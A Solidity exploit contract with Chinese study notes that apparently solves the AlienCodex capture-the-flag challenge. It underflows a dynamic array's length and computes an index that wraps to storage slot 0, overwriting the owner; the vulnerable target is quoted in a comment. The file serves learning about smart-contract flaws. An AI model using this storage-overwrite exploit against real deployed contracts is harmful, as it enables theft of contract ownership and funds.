// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
interface IAlienCode {
  function owner() external view returns(address);
  function makeContact() external;
  function revise(uint i, bytes32 _content) external;
  function retract() external ;
}
contract Hack {
  constructor(IAlienCode target){//这个地方再复习一下，普通的地址变量占20个字节
  //slot 0--owner地址和contact地址，而slot 1当中存储的是数组的长度（这个仅限于动态数组）再然后
  //slot h=keccak256(1)---codex[0]值得注意的是，数组存储地址是按照哈希的方式；来存储的
  //slot h+1           ---codex[1]
  //bytes32[] public codex;这个含义是创造一个不定长数组，每个元素为一个32字节的数组,这是题目中的含义
  //但是当我直接调用retract函数也就是最后一个元素的时候的时候，会创建2**256-1个 （一共有2**256个槽位，又由于有2个已经有了）
  //这一步的步骤是使得bytes32的元素范围能够重叠并且访问
  /*所以我们要找的是这样一个i，使得最后能够访问slot 0，所以也就是slot h+i最后能等于0,那么i=0-h了*/
    target.makeContact();
    target.retract();
    uint256 h=uint256(keccak256(abi.encode(uint256(1))));
    uint256 i;//方便回忆，这个地方初始值是0，所以方便减去来整数溢出
    unchecked {
      i-=h;
    }
    target.revise(i,bytes32(uint256(uint160(msg.sender))));
    require(target.owner()==msg.sender, "hacked failed");
  }
  
}
/*由于这个目标合约引入的Ownable题目没有给出，所以只能通过写入接口的形式来进行攻击
import '../helpers/Ownable-05.sol';

contract AlienCodex is Ownable {//给出提示，owner为第一个

  bool public contact;
  bytes32[] public codex;//这个含义是创造一个不定长数组，每个元素为一个32字节的数组

  modifier contacted() {//这边修饰了每一个函数，所以要先调用makeContact
    assert(contact);
    _;
  }
  
  function makeContact() public {
    contact = true;
  }

  function record(bytes32 _content) contacted public {
    codex.push(_content);
  }

  function retract() contacted public {//本来看似只能减少不能增加访问权限，但是可以用整数溢出来解决
    codex.length--;//这个地方用于攻击，通过以太坊的结构，可以在8.0以前整数溢出来获取改变整个合约其他变量的值，所以通过这个改变true
  }

  function revise(uint i, bytes32 _content) contacted public {
    codex[i] = _content;
  }
}*/